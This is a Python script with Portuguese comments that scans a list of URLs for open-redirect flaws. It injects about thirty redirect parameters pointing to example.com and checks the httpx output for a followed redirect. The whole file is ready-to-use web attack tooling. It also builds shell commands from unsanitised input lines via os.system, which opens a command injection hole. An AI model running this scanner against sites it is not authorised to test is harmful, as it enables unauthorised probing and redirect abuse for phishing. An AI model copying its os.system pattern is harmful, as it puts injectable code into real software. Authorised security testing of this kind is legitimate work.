import os
import argparse

# Criação do parser de argumentos
parser = argparse.ArgumentParser(description='Exibe uma lista de URLs.')
parser.add_argument('-l', '--lista', type=str, help='Arquivo contendo a lista de URLs.')

# Parse dos argumentos
args = parser.parse_args()

# Abre o arquivo de texto com a lista de URLs
with open(args.lista, 'r') as f:
    # Loop através das linhas do arquivo
    for line in f:
        # Remove os espaços em branco e caracteres de nova linha
        url = line.strip()

        payload_op_1 = "?redirect=https://example.com&url=https://example.com&link=https://example.com&return=https://example.com&next=https://example.com&return_url=https://example.com&return_uri=https://example.com&return_path=https://example.com&returnto=https://example.com&return_to=https://example.com&target=https://example.com&destination=https://example.com&returnPath=https://example.com&redirect_uri=https://example.com&redirect_url=https://example.com&goto=https://example.com"
        payload_op_2 = "?continue=https://example.com&destination=https://example.com&uri=https://example.com&go=https://example.com&to=https://example.com&returnuri=https://example.com&returnpath=https://example.com&return-path=https://example.com&callback=https://example.com&ref=https://example.com&path=https://example.com&page=https://example.com&view=https://example.com&redir=https://example.com&redirect_to=https://example.com&destination_url=https://example.com"


        execucao_op_1 = "echo '"+url+""+payload_op_1+"'|httpx -silent -fr -title|grep 'Example'"
        execucao_op_2 = "echo '"+url+""+payload_op_2+"'|httpx -silent -fr -title|grep 'Example'"

        os.system(execucao_op_1)
        os.system(execucao_op_2)
        
        execucao_op_1 = "echo '"+url+""+payload_op_1+"'|httpx -silent -mr 'Location: https://example.com'"
        execucao_op_2 = "echo '"+url+""+payload_op_2+"'|httpx -silent -mr 'Location: https://example.com'"

        os.system(execucao_op_1)
        os.system(execucao_op_2)
